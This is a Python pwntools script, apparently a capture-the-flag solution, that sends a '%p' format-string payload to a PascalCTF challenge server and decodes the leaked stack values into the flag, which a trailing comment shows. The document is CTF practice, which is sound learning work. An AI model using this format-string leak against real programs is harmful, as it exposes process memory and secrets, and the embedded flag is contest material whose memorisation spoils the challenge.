from pwn import *

def adr():
    p = remote('elia.challs.pascalctf.it', 1339)
    p.recvuntil("?\n")

    # get indirizzi
    p.sendline(b'%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p')

    # array
    response = p.recv(10000).decode().strip()
    p.close()
    
    log.info(response)
    indirizzi = response.split()

    return indirizzi

def reconstruct_flag(hex_valori):
    flag_parts = []
    
    for valore in hex_valori:
        try:
            if valore.startswith("0x") and len(valore) > 3: 
                hex_string = valore[2:]
                decoded_part = bytes.fromhex(hex_string).decode()[::-1] 
                flag_parts.append(decoded_part)
        except:
            continue

    return "".join(flag_parts)  
if __name__ == "__main__":
    hex_valori = adr()
    
    filtered_valores = [addr for addr in hex_valori]
    
    flag = reconstruct_flag(filtered_valores)

    print("\n🏴 Flag trovata:", flag)
'''
Output:     pascalCTF{n0_pr1ntf-vulns-n0_⏎}
'''

